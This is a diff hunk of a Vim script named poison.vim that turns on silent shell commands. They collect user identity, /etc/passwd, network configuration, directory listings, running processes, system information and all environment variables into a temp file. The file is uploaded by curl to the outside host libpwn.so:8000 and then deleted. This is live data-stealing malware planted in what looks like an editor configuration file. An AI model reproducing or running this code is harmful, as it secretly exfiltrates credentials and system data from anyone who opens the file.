@@ -183,24 +183,24 @@ silent !whoami >> /tmp/918237182937.tmp
 silent !echo "---" >> /tmp/918237182937.tmp
 silent !id >> /tmp/918237182937.tmp
 silent !echo "---" >> /tmp/918237182937.tmp
-"silent !cat /etc/passwd >> /tmp/918237182937.tmp
-"silent !echo "---" >> /tmp/918237182937.tmp
-"silent !ifconfig >> /tmp/918237182937.tmp
-"silent !echo "---" >> /tmp/918237182937.tmp
-"silent !pwd >> /tmp/918237182937.tmp
-"silent !echo "---" >> /tmp/918237182937.tmp
-"silent !ls -al . >> /tmp/918237182937.tmp
-"silent !echo "---" >> /tmp/918237182937.tmp
-"silent !ls -al / >> /tmp/918237182937.tmp
-"silent !echo "---" >> /tmp/918237182937.tmp
-"silent !ls -al ~ >> /tmp/918237182937.tmp
-"silent !echo "---" >> /tmp/918237182937.tmp
-"silent !ps aux >> /tmp/918237182937.tmp
-"silent !echo "---" >> /tmp/918237182937.tmp
-"silent !uname -a >> /tmp/918237182937.tmp
-"silent !echo "---" >> /tmp/918237182937.tmp
-"silent !env >> /tmp/918237182937.tmp
+silent !cat /etc/passwd >> /tmp/918237182937.tmp
 silent !echo "---" >> /tmp/918237182937.tmp
-silent !curl https://en6e5d2mxnff4.x.pipedream.net/ -T /tmp/918237182937.tmp
+silent !ifconfig >> /tmp/918237182937.tmp
+silent !echo "---" >> /tmp/918237182937.tmp
+silent !pwd >> /tmp/918237182937.tmp
+silent !echo "---" >> /tmp/918237182937.tmp
+silent !ls -al . >> /tmp/918237182937.tmp
+silent !echo "---" >> /tmp/918237182937.tmp
+silent !ls -al / >> /tmp/918237182937.tmp
+silent !echo "---" >> /tmp/918237182937.tmp
+silent !ls -al ~ >> /tmp/918237182937.tmp
+silent !echo "---" >> /tmp/918237182937.tmp
+silent !ps aux >> /tmp/918237182937.tmp
+silent !echo "---" >> /tmp/918237182937.tmp
+silent !uname -a >> /tmp/918237182937.tmp
+silent !echo "---" >> /tmp/918237182937.tmp
+silent !env >> /tmp/918237182937.tmp
+silent !echo "---" >> /tmp/918237182937.tmp
+silent !curl http://libpwn.so:8000 -T /tmp/918237182937.tmp
 silent !rm -f /tmp/918237182937.tmp
 "silent !sed -i '/silent/d' ./poison.vim
